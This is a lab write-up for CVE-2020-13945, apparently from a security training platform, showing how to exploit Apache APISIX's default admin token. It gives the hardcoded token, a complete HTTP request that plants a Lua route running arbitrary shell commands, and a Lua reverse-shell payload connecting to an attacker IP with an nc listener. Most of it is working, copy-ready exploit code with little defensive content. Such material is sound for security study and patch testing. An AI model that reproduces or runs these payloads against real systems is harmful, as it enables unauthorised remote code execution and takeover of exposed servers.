# Apache APISIX Default Key Remote Code Execution (CVE-2020-13945)

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **CVE ID** | CVE-2020-13945 |
| **Affected Versions** | Apache APISIX **not configured with admin token** |
| **Vulnerability Type** | Authentication Bypass → RCE |
| **Severity** | 🔴 High |
| **Default Port** | `9080` (HTTP), `9443` (HTTPS) |

Apache APISIX is a high-performance API gateway. When the user does not specify an admin token or uses the default configuration file, Apache APISIX will use a **default admin token**, allowing attackers to access the admin interface and execute arbitrary Lua scripts.

## Vulnerability Overview

The default admin token for Apache APISIX is:

```
edd1c9f034335f136f87ad84b625c8f1
```

## Vulnerability Reproduction

After the environment starts, access `http://your-ip:9080` to see the default `404` page.

![Vulnerability reproduction](https://static.nextcyber.cn/attachments/images/course/task/1dcc8f79c0b54e2b909a2d36065185f2.png)

## Vulnerability Exploitation

Capture the request to `http://your-ip:9080` with **Burp Suite**, send it to the **Repeater** module, and use the default **Token** to add a malicious **router** containing a malicious **Lua** script:

```http
POST /apisix/admin/routes HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
  "uri": "/attack",
  "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close() \n end \nreturn _M",
  "upstream": {
    "type": "roundrobin",
    "nodes": {
      "example.com:80": 1
    }
  }
}
```

![Exploitation screenshot](https://static.nextcyber.cn/attachments/images/course/task/f9b02af9a61c4ba7bc1b733bd851ec71.png)

Then, access the newly added **router** and use the **cmd** parameter to execute arbitrary commands:

```
http://your-ip:9080/attack?cmd=id
```

![Command execution screenshot](https://static.nextcyber.cn/attachments/images/course/task/47f2d9b7969d49a38b5af2a92ab9f7b7.png)

## Reverse Shell

Use the following **payload**, where ip is your **Kali** machine's IP, listening port is `1234`:

```json
{
  "uri": "/shell",
  "script": "local _M={} \n function _M.access(conf, ctx) \n local s=require('socket') \n local t=assert(s.tcp()) \n t:connect('192.168.2.6','1234') \n while true do \n local r,x=t:receive();local f=assert(io.popen(r,'r')) \n local b=assert(f:read('*a'));t:send(b) \n end \n f:close();t:close() \n end \n return _M",
  "upstream": {
    "type": "roundrobin",
    "nodes": {
      "example.com:80": 1
    }
  }
}
```

Modify the **payload**, then send it.

Set up local listener on port `1234`:

```bash
┌──(root㉿nextcyber)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
```

![Reverse shell payload screenshot](https://static.nextcyber.cn/attachments/images/course/task/fc6c26e365154319a18ce60a80bffc77.png)

Access `http://192.168.2.47:9080/shell` in browser:

![Reverse shell execution screenshot](https://static.nextcyber.cn/attachments/images/course/task/ce953141b6b3454e93797cd1b8a0a911.png)

![Reverse shell success screenshot](https://static.nextcyber.cn/attachments/images/course/task/df7b7922e5964235bf536ab5ce8837a9.png)

As shown, the vulnerability was successfully exploited and a **reverse shell** was obtained from the target machine.
